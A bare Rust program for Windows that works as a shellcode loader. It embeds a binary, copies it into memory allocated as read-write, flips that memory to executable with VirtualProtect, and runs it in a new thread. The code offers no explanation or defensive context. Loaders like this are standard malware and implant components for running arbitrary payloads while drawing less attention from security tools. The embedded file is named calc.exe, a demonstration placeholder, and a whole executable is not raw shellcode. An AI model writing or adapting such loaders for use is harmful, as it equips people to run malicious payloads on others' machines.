use std::mem::transmute;
use std::ptr::{copy_nonoverlapping, null, null_mut};
use windows_sys::Win32::Foundation::WAIT_FAILED;
use windows_sys::Win32::System::Memory::*;
use windows_sys::Win32::System::Threading::{CreateThread, WaitForSingleObject};

fn main() {
    unsafe {
    let shellcode = include_bytes!("./calc.exe");

        let buffer = VirtualAlloc(
            null(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        copy_nonoverlapping(shellcode.as_ptr(), buffer.cast(), shellcode.len());
        let mut oldprotect = PAGE_READWRITE;
        VirtualProtect(buffer, shellcode.len(), PAGE_EXECUTE, &mut oldprotect);
        let buffer = transmute(buffer);
        let th = CreateThread(null(), 0, buffer, null(), 0, null_mut());
        WaitForSingleObject(th, WAIT_FAILED);
    }
}
